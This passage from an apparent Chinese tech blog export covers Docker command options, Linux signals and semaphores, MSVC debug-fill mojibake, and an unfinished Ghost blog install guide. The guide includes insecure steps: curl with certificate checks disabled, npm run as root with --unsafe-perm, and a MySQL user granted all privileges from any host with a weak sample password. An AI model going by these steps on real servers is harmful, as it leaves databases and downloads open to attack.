创建镜像<br><br>Options:<br>--build-arg=[] :设置镜像创建时的变量；<br>--cpu-shares :设置 cpu 使用权重；<br>--cpu-period :限制 CPU CFS周期；<br>--cpu-quota :限制 CPU CFS配额；<br>--cpuset-cpus :指定使用的CPU <span class="hljs-built_in">id</span>；<br>--cpuset-mems :指定使用的内存 <span class="hljs-built_in">id</span>；<br>--disable-content-trust :忽略校验，默认开启；<br>-f :指定要使用的Dockerfile路径；<br>--force-rm :设置镜像过程中删除中间容器；<br>--isolation :使用容器隔离技术；<br>--label=[] :设置镜像使用的元数据；<br>-m :设置内存最大值；<br>--memory-swap :设置Swap的最大值为内存+swap，<span class="hljs-string">&quot;-1&quot;</span>表示不限swap；<br>--no-cache :创建镜像的过程不使用缓存；<br>--pull :尝试去更新镜像的新版本；<br>--quiet, -q :安静模式，成功后只输出镜像 ID；<br>--<span class="hljs-built_in">rm</span> :设置镜像成功后删除中间容器；<br>--shm-size :设置/dev/shm的大小，默认值是64M；<br>--<span class="hljs-built_in">ulimit</span> :Ulimit配置。<br>--tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。<br>--network: 默认 default。在构建期间设置RUN指令的网络模式<br><br>Examples:<br>docker build -t runoob/ubuntu:v1 .<br>docker build github.com/creack/docker-firefox<br>docker build -f /path/to/a/Dockerfile .<br>docker build -t <span class="hljs-built_in">test</span>/myapp .<br></code></pre></td></tr></table></figure><h3 id="2-5-5、history-命令"><a href="#2-5-5、history-命令" class="headerlink" title="2.5.5、history 命令"></a>2.5.5、history 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">history</span> [OPTIONS] IMAGE : 查看指定镜像的创建历史<br><br>Options:<br>-H :以可读的格式打印镜像大小和日期，默认为<span class="hljs-literal">true</span>；<br>--no-trunc :显示完整的提交记录；<br>-q :仅列出提交记录ID;<br><br>Examples:<br>docker <span class="hljs-built_in">history</span> runoob/ubuntu:v3<br><br></code></pre></td></tr></table></figure><h3 id="2-5-6、save-命令"><a href="#2-5-6、save-命令" class="headerlink" title="2.5.6、save 命令"></a>2.5.6、save 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker save [OPTIONS] IMAGE [IMAGE...]: 将指定镜像保存成 tar 归档文件<br><br>Options:<br>-o :输出到的文件<br><br>Examples:<br>docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3<br></code></pre></td></tr></table></figure><h3 id="2-5-7、import-命令"><a href="#2-5-7、import-命令" class="headerlink" title="2.5.7、import 命令"></a>2.5.7、import 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]： 从归档文件中创建镜像<br><br>Options:<br>-c :应用docker 指令创建镜像；<br>-m :提交时的说明文字；<br><br>Examples:<br>docker import my_ubuntu_v3.tar runoob/ubuntu:v4<br>docker images runoob/ubuntu:v4<br></code></pre></td></tr></table></figure><h2 id="2-6、info-version"><a href="#2-6、info-version" class="headerlink" title="2.6、info|version"></a>2.6、info|version</h2><h3 id="2-6-1、info-命令"><a href="#2-6-1、info-命令" class="headerlink" title="2.6.1、info 命令"></a>2.6.1、info 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker info [OPTIONS]: 显示 Docker 系统信息，包括镜像和容器数<br><br>Examples:<br>docker info<br></code></pre></td></tr></table></figure><h3 id="2-6-2、version-命令"><a href="#2-6-2、version-命令" class="headerlink" title="2.6.2、version 命令"></a>2.6.2、version 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker version [OPTIONS]:显示 Docker 版本信息<br><br>Options:<br>-f :指定返回值的模板文件<br><br>Examples:<br>docker version<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux的信号与信号量机制</title>
      <link href="/2017/07/12/singnal-semaphore/"/>
      <url>/2017/07/12/singnal-semaphore/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信号-Signal-机制"><a href="#一、信号-Signal-机制" class="headerlink" title="一、信号(Signal)机制"></a>一、信号(Signal)机制</h2><p>Signal，又简称为信号（软中断信号）用来通知进程发生了异步事件，<strong>是一种处理异步事件的方式</strong>。一个进程不必通过任何操作来等待信号的到达，事实上，进程也不知道信号到底什么时候到达。进程之间可以互相通过系统调用kill发送软中断信号。内核也可以因为内部事件而给进程发送信号，通知进程发生了某个事件。信号机制除了基本通知功能外，还可以传递附加信息。</p><p>按照不同的分类角度（可靠性方面，与时间的关系上）可以对信号进行区分：</p><ul><li><strong>可靠信号（实时信号）</strong>：支持排队, 信号不会丢失，发多少次进程就可会收到多少次，信号值取值区间为<code>34</code>~&#96;64&#96;；</li><li><strong>不可靠信号（非实时信号）</strong>：不支持排队，信号可能会丢失，比如发送多次相同的信号，进程只能收到一次，信号值取值区间为<code>1</code>~&#96;31&#96;；</li></ul><h3 id="2-1、信号表"><a href="#2-1、信号表" class="headerlink" title="2.1、信号表"></a>2.1、信号表</h3><h4 id="2-1-1、不可靠信号（非实时信号）表"><a href="#2-1-1、不可靠信号（非实时信号）表" class="headerlink" title="2.1.1、不可靠信号（非实时信号）表"></a>2.1.1、不可靠信号（非实时信号）表</h4><table><thead><tr><th align="center">取值</th><th align="center">名称</th><th align="center">解释</th><th align="center">取值</th><th align="center">名称</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">SIGHUP</td><td align="center">挂起</td><td align="center">2</td><td align="center">SIGINT</td><td align="center">中断</td></tr><tr><td align="center">3</td><td align="center">SIGQUIT</td><td align="center">退出</td><td align="center">4</td><td align="center">SIGILL</td><td align="center">非法指令</td></tr><tr><td align="center">5</td><td align="center">SIGTRAP</td><td align="center">断点或陷阱指令</td><td align="center">6</td><td align="center">SIGABRT</td><td align="center">abort发出的信号</td></tr><tr><td align="center">7</td><td align="center">SIGBUS</td><td align="center">非法内存访问</td><td align="center">8</td><td align="center">SIGFPE</td><td align="center">浮点异常</td></tr><tr><td align="center">9</td><td align="center">SIGKILL</td><td align="center">kill信号</td><td align="center">10</td><td align="center">SIGUSR1</td><td align="center">用户信号1</td></tr><tr><td align="center">11</td><td align="center">SIGSEGV</td><td align="center">无效内存访问</td><td align="center">12</td><td align="center">SIGUSR2</td><td align="center">用户信号2</td></tr><tr><td align="center">13</td><td align="center">SIGPIPE</td><td align="center">管道破损，没有读端的管道写数据</td><td align="center">14</td><td align="center">SIGALRM</td><td align="center">alarm发出的信号</td></tr><tr><td align="center">15</td><td align="center">SIGTERM</td><td align="center">终止信号</td><td align="center">16</td><td align="center">SIGSTKFLT</td><td align="center">栈溢出</td></tr><tr><td align="center">17</td><td align="center">SIGCHLD</td><td align="center">子进程退出</td><td align="center">18</td><td align="center">SIGCONT</td><td align="center">进程继续</td></tr><tr><td align="center">19</td><td align="center">SIGSTOP</td><td align="center">进程停止</td><td align="center">20</td><td align="center">SIGTSTP</td><td align="center">进程停止</td></tr><tr><td align="center">21</td><td align="center">SIGTTIN</td><td align="center">进程停止，后台进程从终端读数据时</td><td align="center">22</td><td align="center">SIGTTOU</td><td align="center">进程停止，后台进程向终端写数据时</td></tr><tr><td align="center">23</td><td align="center">SIGURG</td><td align="center">I&#x2F;O有紧急数据到达当前进程</td><td align="center">24</td><td align="center">SIGXCPU</td><td align="center">进程的CPU时间片到期</td></tr><tr><td align="center">25</td><td align="center">SIGXFSZ</td><td align="center">文件大小的超出上限</td><td align="center">26</td><td align="center">SIGVTALRM</td><td align="center">虚拟时钟超时</td></tr><tr><td align="center">27</td><td align="center">SIGPROF</td><td align="center">profile时钟超时</td><td align="center">28</td><td align="center">SIGWINCH</td><td align="center">窗口大小改变</td></tr><tr><td align="center">29</td><td align="center">SIGIO</td><td align="center">I&#x2F;O相关</td><td align="center">30</td><td align="center">SIGPWR</td><td align="center">关机</td></tr><tr><td align="center">31</td><td align="center">SIGSYS</td><td align="center">系统调用异常</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h4 id="2-1-2、可靠信号（实时信号）表"><a href="#2-1-2、可靠信号（实时信号）表" class="headerlink" title="2.1.2、可靠信号（实时信号）表"></a>2.1.2、可靠信号（实时信号）表</h4><table><thead><tr><th align="center">取值</th><th align="center">名称</th><th align="center">取值</th><th align="center">名称</th><th align="center">取值</th><th align="center">名称</th></tr></thead><tbody><tr><td align="center">34</td><td align="center">SIGRTMIN</td><td align="center">35</td><td align="center">SIGRTMIN+1</td><td align="center">36</td><td align="center">SIGRTMIN+2</td></tr><tr><td align="center">37</td><td align="center">SIGRTMIN+3</td><td align="center">38</td><td align="center">SIGRTMIN+4</td><td align="center">39</td><td align="center">SIGRTMIN+5</td></tr><tr><td align="center">40</td><td align="center">SIGRTMIN+6</td><td align="center">41</td><td align="center">SIGRTMIN+7</td><td align="center">42</td><td align="center">SIGRTMIN+8</td></tr><tr><td align="center">43</td><td align="center">SIGRTMIN+9</td><td align="center">44</td><td align="center">SIGRTMIN+10</td><td align="center">45</td><td align="center">SIGRTMIN+11</td></tr><tr><td align="center">46</td><td align="center">SIGRTMIN+12</td><td align="center">47</td><td align="center">SIGRTMIN+13</td><td align="center">48</td><td align="center">SIGRTMIN+14</td></tr><tr><td align="center">49</td><td align="center">SIGRTMIN+15</td><td align="center">50</td><td align="center">SIGRTMAX-14</td><td align="center">51</td><td align="center">SIGRTMAX-13</td></tr><tr><td align="center">52</td><td align="center">SIGRTMAX-12</td><td align="center">53</td><td align="center">SIGRTMAX-11</td><td align="center">54</td><td align="center">SIGRTMAX-10</td></tr><tr><td align="center">55</td><td align="center">SIGRTMAX-9</td><td align="center">56</td><td align="center">SIGRTMAX-8</td><td align="center">57</td><td align="center">SIGRTMAX-7</td></tr><tr><td align="center">58</td><td align="center">SIGRTMAX-6</td><td align="center">59</td><td align="center">SIGRTMAX-5</td><td align="center">60</td><td align="center">SIGRTMAX-4</td></tr><tr><td align="center">61</td><td align="center">SIGRTMAX-3</td><td align="center">62</td><td align="center">SIGRTMAX-2</td><td align="center">63</td><td align="center">SIGRTMAX-1</td></tr><tr><td align="center">64</td><td align="center">SIGRTMAX</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="2-2、信号触发"><a href="#2-2、信号触发" class="headerlink" title="2.2、信号触发"></a>2.2、信号触发</h3><ul><li><strong>硬件方式：</strong><ul><li>终端输入：例如， <code>Ctrl + C(SIGINT)</code>、<code>Ctrl + \(SIGQUIT)</code>、<code>Ctrl + Z(SIGTSTP)</code>；</li><li>硬件检测异常：由硬件检测到并通知内核并由内核向当前进程发送适当的信号。例如除 0 导致 CPU 产生异常，内核将该异常解释为 <code>SIGFPE</code> 信号发送给进程，访问非法内存地址导致 MMU 产生异常，内核将该异常解释为 <code>SIGSEGV</code> 信号发送给进程；</li></ul></li><li><strong>软件方式：</strong><ul><li>使用如下指令给进程发送信号：<code>kill()</code>，<code>raise()</code>，<code>sigqueue()</code>，<code>alarm()</code>，<code>abort()</code>等；</li></ul></li></ul><h3 id="2-3、信号处理"><a href="#2-3、信号处理" class="headerlink" title="2.3、信号处理"></a>2.3、信号处理</h3><ul><li><strong>默认</strong>：默认的处理方式；</li><li><strong>自定义</strong>：使用自定义的信号捕获函数捕获信号后进行处理；</li><li><strong>忽略</strong>：对指定信号不做处理；</li></ul><h2 id="二、信号量（Semaphore）机制"><a href="#二、信号量（Semaphore）机制" class="headerlink" title="二、信号量（Semaphore）机制"></a>二、信号量（Semaphore）机制</h2><p>信号量在创建时需要设置一个初始值，表示同时可以有几个任务可以访问该信号量保护的共享资源，初始值为<code>1</code>就变成互斥锁（Mutex），即同时只能有一个任务可以访问信号量保护的共享资源，<strong>是进程间通信处理同步互斥的机制</strong>。</p><p>一个任务要想访问共享资源，首先必须得到信号量，获取信号量的操作将把信号量的值<code>减1</code>，若当前信号量的值为<code>负数</code>，表明无法获得信号量，该任务必须挂起在该信号量的等待队列等待该信号量可用；若当前信号量的值为<code>非负数</code>，表示可以获得信号量，因而可以立刻访问被该信号量保护的共享资源。</p><p> 当任务访问完被信号量保护的共享资源后，必须释放信号量，释放信号量通过把信号量的值<code>加1</code>实现，如果信号量的值为<code>非正数</code>，表明有任务等待当前信号量，因此它也唤醒所有等待该信号量的任务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 信号 </tag>
            
            <tag> 信号量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言中有趣的烫烫烫</title>
      <link href="/2017/06/04/c-encoding-problem/"/>
      <url>/2017/06/04/c-encoding-problem/</url>
      
        <content type="html"><![CDATA[<p>在学校使用 Windows 下的 Visual Studio 2017 进行课堂C的学习过程中遇到过很多类似于 烫烫烫烫烫烫 , 锟斤拷，屯屯屯 等比较有意思的乱码，也闹出了一些比较有意思的事情。</p><h2 id="一、现象"><a href="#一、现象" class="headerlink" title="一、现象"></a>一、现象</h2><p>以下是部分乱码在不同的编码类型下的编码值：</p><table><thead><tr><th align="center">字符</th><th align="center">简体中文(GB2312)</th><th align="center">Unicode</th><th align="center">Unicode (UTF-8)</th></tr></thead><tbody><tr><td align="center">烫</td><td align="center">CCCC</td><td align="center">EB70</td><td align="center">E783AB</td></tr><tr><td align="center">锟</td><td align="center">EFBF</td><td align="center">1F95</td><td align="center">E9949F</td></tr><tr><td align="center">斤</td><td align="center">BDEF</td><td align="center">A465</td><td align="center">E696A4</td></tr><tr><td align="center">拷</td><td align="center">BFBD</td><td align="center">F762</td><td align="center">E68BB7</td></tr><tr><td align="center">屯</td><td align="center">CDCD</td><td align="center">6F5C</td><td align="center">E5B1AF</td></tr><tr><td align="center">锘</td><td align="center">EFBB</td><td align="center">1895</td><td align="center">E99498</td></tr><tr><td align="center">傻</td><td align="center">C9B5</td><td align="center">BB50</td><td align="center">E582BB</td></tr></tbody></table><h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h2><p>以上比较有意思的乱码情况仅出现在使用Visual Studio或者VC6.0自带的MSVC编译器进行编译时才会出现，也就是说通常只有在Windows环境下使用Visual Studio或者VC6.0进行代码开发，并且处于Debug的运行模式才会出现。</p><h3 id="2-1、烫（0xCCCC）"><a href="#2-1、烫（0xCCCC）" class="headerlink" title="2.1、烫（0xCCCC）"></a>2.1、烫（0xCCCC）</h3><p>MSVC编译器会将<strong>未被初始化的栈内存</strong>使用<code>0XCC</code>进行填充，导致我们在使用为初始化的栈内存时便会出现<code>烫烫烫</code>的错误提示；</p><p><img src="/assets/images/0xcccc.png" alt="烫（0xCCCC）" loading="lazy"></p><h3 id="2-2、屯（0xCDCD）"><a href="#2-2、屯（0xCDCD）" class="headerlink" title="2.2、屯（0xCDCD）"></a>2.2、屯（0xCDCD）</h3><p><strong>MSVC编译器会将</strong>未被初始化的堆内存使用<code>0XCD</code>进行填充，导致我们在使用为初始化的栈内存时便会出现<code>屯屯屯</code>的错误提示；</p><p><img src="/assets/images/0xcdcd.png" alt="屯（0xCDCD）" loading="lazy"></p><h3 id="2-3、锟斤拷"><a href="#2-3、锟斤拷" class="headerlink" title="2.3、锟斤拷"></a>2.3、锟斤拷</h3><p><strong>锟斤拷</strong>涉及<code>Unicode</code>字符集转换问题，在编码转化你的过程中，当Unicode无法表示一个字符的时候，它会用一个占位符（U+FFFD REPLACEMENT CHARACTER）来表示这些文字。U+FFFD的UTF-8编码是<code>0xEFBFBD</code>，如果重复多次形成<strong>锟斤拷</strong>的盛状。</p><p><img src="/assets/images/0xefbfbdefbfbd.png" alt="锟斤拷" loading="lazy"></p><h3 id="2-4、锘"><a href="#2-4、锘" class="headerlink" title="2.4、锘"></a>2.4、锘</h3><p>微软在 <code>UTF-8</code> 文件头部加上了 <code>EF BB BF BOM</code> 标志。在不支持 BOM 的环境下对其停止 UTF-8 解码失掉<strong>锘</strong>字，</p><p><code>BOM</code> 是 <code>Byte Order Mark</code> 的缩写。是UTF编码方案里用于标识编码的标准标记，在<code>UTF-16</code>里本来是<code>FF FE</code>，变成<code>UTF-8</code>就成了<code>EF BB BF</code>。这个标记是可选的，因为<code>UTF8</code>字节没有顺序，所以它可以被用来检测一个字节流是否是<code>UTF-8</code>编码的。</p><p><img src="/assets/images/0xefbb.png" alt="锘" loading="lazy"></p><p>参考地址：<a href="https://zhuanlan.zhihu.com/p/27253604">https://zhuanlan.zhihu.com/p/27253604</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Windows </tag>
            
            <tag> 编程语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ghost博客成功&quot;更新&quot;至0.11.9</title>
      <link href="/2017/05/27/ghost-0-11-9/"/>
      <url>/2017/05/27/ghost-0-11-9/</url>
      
        <content type="html"><![CDATA[<p>Ghost真的是一个让我又爱又恨的博客平台，界面的简洁之美，写作的流畅与舒适，还有那烦人的安装与更新操作。在差不多一年之前吧，我安装了版本是 <code>0.7.4</code> 的Ghost平台，那时候用的是<a href="http://www.ghostchina.com/" target="_blank">Ghost中文网</a>中的那个 <code>Ghost 中文集成版</code> ，当时也是费了很多周折，使用到现在也没有出现什么问题。也是在最近几天，闲着没事去Ghost中文网看了看，竟然还是 <code>0.7.4</code> 的版本！心想难道Ghost一直没更新？于是去英文官网看了看，才发现原来Ghost有两个路线，一个是 <code>Alpha</code> 版本，已经更新到了 <code>Alpha.21</code> ，一个是正式版，也已经更新到了 <code>0.11.9</code> ；而Ghost中文网的内容就有点滞后了，希望可以尽快更新。之后我就想体验新版本的Ghost。开始吧~</p><h2 id="一、尝试更新Ghost"><a href="#一、尝试更新Ghost" class="headerlink" title="一、尝试更新Ghost"></a>一、尝试更新Ghost</h2><p>根据Ghost英文官网的 <a href="https://support.ghost.org/how-to-upgrade" target="_blank">How-To-Upgrade</a>更新指导步骤，我整理如下：</p><ul><li>备份：在后台中的”实验室”栏目中导出一个 <code>.json文件</code> ，并且将Ghost根目录中的 <code>content目录</code> 进行备份(这里存放着博客站点的所有上传图片和主题)。而我直接是把 <code>整个Ghost目录和数据库</code> 进行了备份。记住：一定要备份！无论你做什么一定要备份！！！</li><li>检查Ghost平台是否可以重启：因为在更新Ghost完成之后，或者更新出错进行调试的时候，需要重启Ghost，所以我们必须确保Ghost可以重启；</li><li>关于跨版本更新的问题：源版本与目标版本如果跨度较大可能会出现问题，所以更新升级的建议如下：</li><li><code>0.7.1</code> 或更高版本应该可以直接升级到 <code>0.11.9</code> ；</li><li><code>0.5.0</code> 或更高版本应该可以直接升级到 <code>0.7.x</code> ；</li><li><code>0.4.2</code> 的版本必须升级到版本 <code>0.7.1</code>（<code>0.7.0</code>有几个升级错误，在<code>0.7.1</code>中被解决），然后升级到更高版本的<code>0.7.x</code>；</li><li><code>0.4.2</code>之前的版本必须按照版本号由低到高升级，直到达到<code>0.4.2</code>；</li><li>下载新版本并解压：可以使用 <code>wget</code> 或者 <code>curl -LOk</code> 下载<br> <code>https://ghost.org/zip/ghost-latest.zip</code> 中的最新版本文件，然后可以使用 <code>unzip Ghost-*.*.*.zip -d ghost-*.*.*</code> 解压。</li><li>删除旧文件&#x2F;复制新文件：删除Ghost更目录下的 <code>core目录</code> 、<code>index.js</code> 、<code>*.md</code> 和 <code>*.json</code> ；复制新版本Ghost目录中的<br> <code>core目录</code> 、 <code>index.js</code> 、 <code>package.json</code> 和 <code>npm-shrinkwrap.json</code> 到目前的Ghost根目录中。</li><li>开始升级：在目前的Ghost目录中执行升级命令 <code>npm install --production --unsafe-perm</code> ，如果期间报错，先删除 <code>node_modules文件夹</code> ，再运行 <code>npm cache clean</code> 并重试。最后运行 <code>npm start --production</code> 进行调试。</li></ul><blockquote><p> 使用 <code>npm install --production --unsafe-perm</code> 需要注意的问题：</p></blockquote><ul><li>添加 <code>--unsafe-perm</code> 的参数的原因是：如果我们不添加这个参数，会出现类似于 <code>npm WARN cannot run in wd test@0.0.0 echo something (wd=/Users/Lloyd/Documents/test)</code> 的错误，原因是如果使用root权限调用 <code>npm</code> ，那么它会将 <code>uid</code> 更改为用户配置指定的 <code>uid</code> ，默认为 <code>nobody</code> ，设置<code> --unsafe-perm</code> 参数以使用root权限运行脚本；</li><li>因为GFW的原因，使用 <code>npm install --production --unsafe-perm</code> 可能会出现很多错误，建议修改一下 <code>npm</code> 的镜像源，这里推荐<a href="http://npm.taobao.org/" target="_blank">淘宝 NPM 镜像</a>，具体使用命令为（其他修改方法见<a href="https://cnodejs.org/topic/4f9904f9407edba21468f31e" target="_blank">这里</a>）：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org <br>npm info underscore（如果上面配置正确这个命令会有字符串response）<br></code></pre></td></tr></table></figure><ul><li>由于我这里不使用 <code>sqlite3</code> ，所以我吧 <code>package.json</code> 中的 <code>sqlite3</code> 依赖包给删除了，否则的话安装会卡住不动。</li></ul><h2 id="二、全新安装Ghost平台"><a href="#二、全新安装Ghost平台" class="headerlink" title="二、全新安装Ghost平台"></a>二、全新安装Ghost平台</h2><p>因为之前安装Ghost也出现了不少问题，但是目前都忘了，为了回顾一下，也为了照顾第一次使用Ghost的用户，这里再说明一下全新安装 <code>Ghost 0.11.9</code> 的方法。下文中部分参考于<a href="https://snowz.me/how-to-install-ghost/" target="_blank">手把手教你搭建一个属于自己的Ghost博客</a></p><h3 id="2-1-安装-Node-环境"><a href="#2-1-安装-Node-环境" class="headerlink" title="2.1 安装 Node 环境"></a>2.1 安装 <code>Node</code> 环境</h3><p>由于 <code>Ghost</code> 是基于 <code>Node</code> 的，所以 <code>Node</code> 的环境是必须第一步要安装的，而 <code>Ghost</code> 对于 <code>Node</code> 版本的要求也是十分苛刻的，具体要求可以去<a href="http://support.ghost.org/supported-node-versions/" target="_blank">官方的说明</a>中去查看，我整理如下：</p><ul><li>Ghost目前支持的Node版本只有 <code>0.12.x</code> 、 <code>4.2+</code> 、 <code>6.9+</code>；</li><li>官方推荐的版本是 <code>4.2+</code> ，经实测使用 <code>4.5</code> 会报错，所以这里的<br> <code>4.2+</code> 应该是指 <code>4.2.*</code> ；</li></ul><p>我在这里使用的 <code>Node</code> 版本是4.2.5，安装Node的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget http://nodejs.org/dist/v4.2.5/node-v4.2.5.tar.gz<br>tar zxvf node-v4.2.5.tar.gz<br><span class="hljs-built_in">cd</span> node-v4.2.5<br>./configure<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="2-2-安装Nginx并配置"><a href="#2-2-安装Nginx并配置" class="headerlink" title="2.2 安装Nginx并配置"></a>2.2 安装Nginx并配置</h3><p>首先我们安装Nginx：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install nginx<br></code></pre></td></tr></table></figure><p>安装之后可以使用IP访问，检查 <code>Nginx</code> 是否安装成功，然后我们需要为Ghost平台在 <code>/etc/nginx/conf.d</code> 目录下创建一个配置文件<br> <code>ghost.conf</code> ：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vi /etc/nginx/conf.d/ghost.conf<br></code></pre></td></tr></table></figure><p>写入的内容如下所示：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#http访问</span><br><span class="hljs-section">server</span> &#123;  <br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> example.com; <span class="hljs-comment">#将example.com改为你的域名或ip</span><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_set_header</span>   X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        <span class="hljs-attribute">proxy_set_header</span>   Host      <span class="hljs-variable">$http_host</span>;<br>        <span class="hljs-attribute">proxy_pass</span>         http://127.0.0.1:2368;<br>    &#125;<br>&#125;<br><span class="hljs-comment">#https访问，可以配置也可以不配置：</span><br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">443</span>;<br><span class="hljs-attribute">server_name</span> example.com; <span class="hljs-comment">#将example.com改为你的域名或ip</span><br><span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">ssl_certificate</span>/etc/crt.crt;<span class="hljs-comment">#证书crt的绝对路径;</span><br><span class="hljs-attribute">ssl_certificate_key</span>    /etc/private.key;<span class="hljs-comment">#私钥key的绝对路径;</span><br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_set_header</span>   X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br><span class="hljs-attribute">proxy_set_header</span>   Host      <span class="hljs-variable">$http_host</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;<br><span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:2368;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>保存退出，然后重启 <code>Nginx</code> 生效配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/etc/init.d/nginx restart<br></code></pre></td></tr></table></figure><h3 id="2-3-安装-MySQL-并配置"><a href="#2-3-安装-MySQL-并配置" class="headerlink" title="2.3 安装 MySQL 并配置"></a>2.3 安装 <code>MySQL</code> 并配置</h3><p>Ghost 默认使用 <code>sqlite3 数据库</code> ， <code>sqlite3 数据库</code> 功能简约，小型化，追求最大磁盘效率，而 <code>MySQL</code> 是完善的服务器数据库，功能全面，综合化，追求最大并发效率，所以我这里使用的是 <code>MySQL</code> ，下面是操作命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt-get install mysql-server <span class="hljs-comment"># 安装Mysql  </span><br>/etc/init.d/mysql restart <span class="hljs-comment"># 启动/重新启动Mysql</span><br>mysql_secure_installation <span class="hljs-comment">#配置Mysql</span><br></code></pre></td></tr></table></figure><p>输入 <code>mysql_secure_installation</code> 回车后，系统可能会询问一些 <code>MySQL</code> 的用户密码安全措施，建议在设置时选择 <code>1 or MEDIUM</code> 即可，这是说明你的 <code>MySQL</code> 用户密码必须包括”数字、大写字母、小写字母、特殊字符”，部分配置的解释为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Set root password? [Y/n] <span class="hljs-comment"># 设置root密码  </span><br>anonymous <span class="hljs-built_in">users</span>? [Y/n] <span class="hljs-comment"># 删除匿名用户  </span><br>Disallow root login remotely? [Y/n] <span class="hljs-comment"># 禁止root用户远程登录  </span><br>Remove <span class="hljs-built_in">test</span> database and access to it? [Y/n] <span class="hljs-comment"># 删除默认的 test 数据库  </span><br>Reload privilege tables now? [Y/n] <span class="hljs-comment"># 刷新授权表使修改生效</span><br></code></pre></td></tr></table></figure><p>为了防止在 <code>MySQL</code> 数据库中出现中文乱码，需要设置 <code>MySQL</code> 的编码，编辑 <code>/etc/mysql/my.cnf</code> 写入如下信息后保存退出，并重启 <code>MySQL</code> 服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[client]<br>default-character-set=utf8mb4<br>[mysql]<br>default-character-set=utf8mb4<br>[mysqld]<br>character-set-server=utf8mb4<br>collation-server=utf8mb4_unicode_ci<br>skip-character-set-client-handshake = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/etc/init.d/mysql restart <span class="hljs-comment">#重启MySQL服务</span><br></code></pre></td></tr></table></figure><p>然后我们新建一个数据库用来存放博客中的文章等信息，并且建立一个用户管理该数据库，由于我们之前设置的 <code>MySQL</code> 数据库用户密码策略，所以密码必须包含”数字、大写字母、小写字母、特殊字符”：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mysql -u root -p <span class="hljs-comment"># 输入设置好的密码  </span><br>create database ghost; <span class="hljs-comment"># 创建ghost数据库  </span><br><span class="hljs-comment"># 新建一个用户ghost，密码为123456Aa!并将ghost数据库授权给它</span><br>grant all privileges on ghost.* to <span class="hljs-string">&#x27;ghost&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified by <span class="hljs-string">&#x27;123456Aa!&#x27;</span>; <br>flush privileges <span class="hljs-comment"># 重新读取权限表中的数据到内存，不用重启mysql就可以让权限生效</span><br></code></pre></td></tr></table></figure><h3 id="2-4-安装-Ghost-并配置"><a href="#2-4-安装-Ghost-并配置" class="headerlink" title="2.4 安装 Ghost 并配置"></a>2.4 安装 <code>Ghost</code> 并配置</h3><p>下载并解压Ghost：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www<br>wget https://ghost.org/zip/ghost-latest.zip<br>unzip Ghost-0.11.9.zip -d ghost<br><span class="hljs-built_in">cd</span> ghost<br></code></pre></td></tr></table></figure><p>修改配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> config.example.js config.js  <br>vi config.js<br></code></pre></td></tr></table></figure><p> <code>Ghost</code> 有生产模式、开发模式和测试模式等多种运行模式，这里我们需要在配置文件中找到 <code>production</code> 模式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生产模式</span><br>production: &#123;  <br>    url: <span class="hljs-string">&#x27;http://snowz.me&#x27;</span>, <span class="hljs-comment"># 修改为你的域名或者IP，注意加上http://</span><br>    mail: &#123;&#125;,<br>    database: 